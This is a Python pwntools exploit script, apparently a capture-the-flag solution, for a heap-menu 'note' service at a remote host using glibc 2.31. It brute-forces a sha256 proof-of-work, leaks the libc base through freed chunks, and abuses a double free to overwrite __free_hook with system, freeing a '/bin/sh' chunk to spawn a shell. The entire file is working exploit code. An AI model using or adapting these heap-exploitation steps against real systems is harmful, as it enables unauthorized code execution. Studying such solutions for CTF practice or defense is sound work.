# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
io = remote('chuj.top', 51505) # chuj.top 51505
libc = ELF('./libc-2.31.so')
# io = process('note')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('2')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def exit(idx):
	sl('4')

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

for i in range(8): # 0-7
    add(i,0xf0,str(i))
add(8,0xf0,str(8)) # 8
for i in range(8): 
    delete(i)
show(7)
libcbase  = l64() - 0x1ebbe0
lg('libcbase')
freehook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('freehook')
lg('system')
lg('binsh')


for i in range(8):  # 0-7
    add(i,0x10,str(i))
add(9,0x10,str(9))
add(10,0x10,str(10))
for i in range(8): # 7
    delete(i)
delete(9)
delete(7)
for i in range(7):  # 0-7
    add(i,0x10,str(i))

# dbg()
add(7,0x10,p64(freehook)*2)
add(9,0x10,'/bin/sh\00')
add(10,0x10,'/bin/sh\00')
add(11,0x10,p64(system))

delete(9)

irt()


